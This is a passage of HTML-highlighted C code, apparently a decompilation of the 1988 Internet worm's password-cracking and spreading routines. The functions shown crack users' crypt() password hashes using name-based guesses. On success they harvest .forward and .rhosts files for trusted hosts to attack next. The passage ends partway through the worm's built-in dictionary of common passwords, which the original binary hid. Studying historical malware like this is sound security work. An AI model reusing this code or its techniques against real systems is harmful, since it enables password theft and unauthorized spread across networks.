    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0">  </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sscanf</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">-&gt;</span><span class="sc11">gecos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%*s %[^ ,]s"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">isupper</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]))</span><span class="sc0">
        </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tolower</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0">  </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">','</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">  </span><span class="sc10">&amp;&amp;</span><span class="sc0">
        </span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">reverse_str</span><span class="sc10">(</span><span class="sc11">usrname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">cmode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">reverse_str</span><span class="sc10">(</span><span class="sc11">str1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str2</span><span class="sc10">)</span><span class="sc0">          </span><span class="sc1">/* x642a */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">length</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">str1</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc11">str2</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(&amp;</span><span class="sc11">str1</span><span class="sc10">[</span><span class="sc11">length</span><span class="sc10">-</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">[-</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">str2</span><span class="sc10">[</span><span class="sc11">length</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">)</span><span class="sc0">            </span><span class="sc1">/* 0x6484, unchecked */</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">passwd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">crypt</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">passwd</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">  </span><span class="sc10">||</span><span class="sc0">
    </span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc0">  </span><span class="sc10">&amp;&amp;</span><span class="sc0">  </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">passwd</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">decoded_passwd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">decoded_passwd</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">decoded_passwd</span><span class="sc10">[</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">decoded_passwd</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">attack_user</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* Collect hostnames and run hueristic #1 for this user's .forward and .rhosts
 */</span><span class="sc0">
</span><span class="sc1">/* This is only called from try_passwd() */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">attack_user</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">)</span><span class="sc0">            </span><span class="sc1">/* 0x6514 */</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fwd_fp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hostpart</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc1">/* l516 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rhbuf</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">                </span><span class="sc1">/* l776 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">l1288</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* l1292 */</span><span class="sc0">

    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%.200s/.forward"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">homedir</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* &lt;other_fd+11
5&gt; */</span><span class="sc0">
    </span><span class="sc11">fwd_fp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"r"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fwd_fp</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fgets</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">fwd_fp</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* 2088,2222 */</span><span class="sc0">
        </span><span class="sc1">/* Punt the newline */</span><span class="sc0">
        </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">hostpart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc1">/* If no hostname, it's not foreign so ignore it. */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hostpart</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* Split username and hostname */</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">hostpart</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc1">/* Here there appears to be a bug!!!  It works correctly
         * by coincidence of pushing things on the stack. */</span><span class="sc0">
</span><span class="sc9">#ifndef FIX_BUGS
</span><span class="sc0">        </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(</span><span class="sc11">hostpart</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hu1</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#else                       </span><span class="sc1">/* original */</span><span class="sc0">
        </span><span class="sc1">/* 'hu1' should have another argument */</span><span class="sc0">
        </span><span class="sc11">hu1</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(</span><span class="sc11">hostpart</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">)));</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fwd_fp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%.200s/.rhosts"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">homedir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fwd_fp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"r"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fwd_fp</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">               </span><span class="sc1">/* 2446 */</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fgets</span><span class="sc10">(</span><span class="sc11">rhbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">rhbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">fwd_fp</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* 2312,2434 */</span><span class="sc0">
        </span><span class="sc11">l1288</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sscanf</span><span class="sc10">(</span><span class="sc11">rhbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%s%s"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l1288</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hu1</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l1288</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fwd_fp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* This array in the sun binary was camaflouged by having the
   high-order bit set in every char. */</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">wds</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">                   </span><span class="sc1">/* 0x21a74 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc6">"academia"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"aerobics"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"airplane"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"albany"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"albatross"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"albert"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"alex"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"alexander"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"algebra"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"aliases"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"alphabet"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"amorphous"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"analog"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"anchor"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"andromache"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"animals"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"answer"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"anthropogenic"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"anvils"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"anything"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"aria"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ariadne"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"arrow"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"arthur"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"athena"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"atmosphere"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"aztecs"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"azure"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"bacchus"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bailey"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"banana"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bananas"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"bandit"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"banks"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"barber"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"baritone"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"bass"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bassoon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"batman"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"beater"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"beauty"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"beethoven"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"beloved"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"benz"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"beowulf"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"berkeley"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"berliner"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"beryl"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"beverly"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bicameral"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"brenda"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"brian"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"bridget"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"broadway"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bumbling"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"burgess"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"campanile"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cantor"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cardinal"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"carmen"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"carolina"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"caroline"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cascades"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"castle"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"cayuga"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"celtics"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cerulean"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"change"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"charles"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"charming"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"charon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"chester"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"cigar"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"classic"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"clusters"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"coffee"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"coke"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"collins"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"commrades"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"computer"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"condo"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cookie"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cooper"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cornelius"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"couscous"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"creation"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"creosote"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cretin"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"daemon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dancer"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"daniel"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"danny"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"dave"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"december"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"defoe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"deluge"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"desperate"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"develop"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dieter"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"digital"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"discovery"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"disney"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"drought"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"duncan"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"eager"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"easier"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"edges"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"edinburgh"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"edwin"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"edwina"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"egghead"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"eiderdown"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"eileen"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"einstein"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"elephant"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"elizabeth"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"ellen"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"emerald"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"engine"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"engineer"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"enterprise"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"enzyme"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ersatz"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"establish"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"estate"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"euclid"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"evelyn"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"extension"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"fairway"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"felicia"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fender"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fermat"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"fidelity"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"finite"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fishers"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"flakes"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"float"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"flower"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"flowers"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"foolproof"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"football"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"foresight"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"format"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"forsythe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"fourier"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fred"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"friend"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"frighten"</span><span class="sc10">,</span><span class="sc0">
